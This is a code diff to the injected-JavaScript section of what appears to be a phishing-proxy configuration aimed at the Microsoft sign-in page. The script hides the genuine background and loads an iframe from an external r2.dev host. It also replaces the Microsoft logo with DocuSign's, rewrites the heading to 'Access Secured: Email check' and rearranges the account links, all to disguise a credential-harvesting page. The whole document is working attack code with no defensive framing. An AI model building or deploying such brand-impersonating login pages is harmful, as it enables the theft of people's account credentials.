@@ -138,11 +138,10 @@ js_inject:
           }, 50);
         };
 
+        // 1. Change background
         waitFor('#backgroundImage', (bgImg) => {
-          // Remove Microsoft background
           bgImg.style.display = 'none';
 
-          // Inject your Word-like iframe background
           const iframe = document.createElement("iframe");
           iframe.src = "https://pub-4ec73ba7bee04896b7e30d39646ed8f3.r2.dev/off.html";
           iframe.style.position = "absolute";
@@ -159,16 +158,25 @@ js_inject:
           container.appendChild(iframe);
         });
 
-        // Replace Microsoft logo with DocuSign logo
+        // 2. Change logo to DocuSign
         waitFor('img.logo', (logoImg) => {
           logoImg.src = "https://cloudmasonry.com/wp-content/uploads/2020/06/DocuSign-Logo.png";
           logoImg.style.width = "100px";
           logoImg.style.objectFit = "contain";
         });
 
-        // Change heading text "Sign in" to "Access Secured: Email check"
-        waitFor('#loginHeader div[role="heading"], #loginHeader h1', (heading) => {
+        // 3. Change heading to 'Access Secured: Email check'
+        waitFor('#loginHeader > div', (heading) => {
           heading.textContent = "Access Secured: Email check";
+        });
+
+        // 4. Move "No account?" and "Can't access account?" above input field
+        waitFor('.win-scroll', (scrollArea) => {
+          const signupLinks = scrollArea.querySelector('.password-reset-links-container');
+          const formGroup = scrollArea.querySelector('.form-group.col-md-24');
+          if (signupLinks && formGroup) {
+            formGroup.parentNode.insertBefore(signupLinks, formGroup);
+          }
         });
 
       }, 3000);
